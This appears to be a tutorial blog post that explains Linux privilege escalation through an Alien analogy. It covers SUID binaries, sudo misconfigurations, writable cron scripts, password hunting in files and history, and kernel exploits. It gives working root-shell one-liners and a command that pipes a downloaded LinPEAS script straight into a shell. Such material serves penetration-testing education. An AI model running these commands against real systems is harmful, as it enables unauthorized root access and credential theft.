# Specimen #007 — The Ghost 👻
## Linux Privilege Escalation: enter as nobody — leave as god

Imagine the Xenomorph from Alien sneaking onto a spaceship.
It’s inside — but trapped in the cargo bay. All doors are sealed. It can’t reach the command bridge.

Privilege Escalation is the moment the creature finds the ventilation shaft.

## Scenario

You’ve breached a server. You’re in.

But you’re just a low-privileged user. Minimal access.
You can’t read other users’ files, can’t stop services, can’t see passwords.

## Current state

www-data@server:~$ whoami
www-data # nobody. a guest. janitor-tier.

## Goal

root@server:~# # god mode.
# full control. sees everything. does anything.

The distance between these two lines is Privilege Escalation.

How the Ghost Finds Ventilation Shafts
## 1. SUID Files

Some binaries in Linux have a special flag: SUID.
This means they run with the permissions of their owner (often root) — no matter who executes them.

Find all SUID files:

find / -perm -u=s -type f 2>/dev/null

If you spot something unusual — that’s a vent.

Example:
A SUID-enabled vim → read any file on the system.

SUID exploitation bible: https://gtfobins.github.io

## 2. Sudo Permissions

sudo -l

This shows what you’re allowed to run with sudo.

Sometimes admins get careless:

User www-data may run the following commands:
(ALL) NOPASSWD: /usr/bin/python3

Python with sudo = instant root:

sudo python3 -c 'import os; os.system("/bin/bash")'

## 3. Cron Jobs

Cron = Linux task scheduler.
Jobs run automatically — often as root.

cat /etc/crontab
ls -la /etc/cron*

If a cron job runs a script you can modify — you control root execution.

Found:
root /opt/cleanup.sh
cleanup.sh is writable by you
Add:

chmod +s /bin/bash

Wait ~1 minute for cron to run
bash gets SUID bit

bash -p
whoami
root # you win

## 4. Passwords in Files

Developers leak secrets everywhere.

Search for passwords:

grep -r "password" /var/www/ 2>/dev/null
grep -r "passwd" /etc/ 2>/dev/null

Check configs:

cat /var/www/html/config.php

Command history:

cat ~/.bash_history

Writable files:

find / -writable -type f 2>/dev/null

## 5. Outdated Kernel (Kernel Exploits)

uname -a

Shows the Linux kernel version.

Old kernel = known vulnerabilities (CVEs).

Famous example:
Dirty COW (CVE-2016-5195)
→ local user to root in seconds on millions of systems.

Ghost’s Toolkit
LinPEAS

Automated enumeration tool. Scans for escalation vectors and highlights weaknesses.

curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
 | sh

GTFOBins

https://gtfobins.github.io

Database of Linux binaries + how to abuse them for privilege escalation.

WinPEAS

Same idea as LinPEAS — but for Windows.

## Final Thought

Privilege escalation isn’t magic.
It’s pattern recognition.

Misconfigurations. Forgotten scripts. Lazy permissions.
Tiny cracks in the system.

The Ghost doesn’t break the door.

It finds the vent.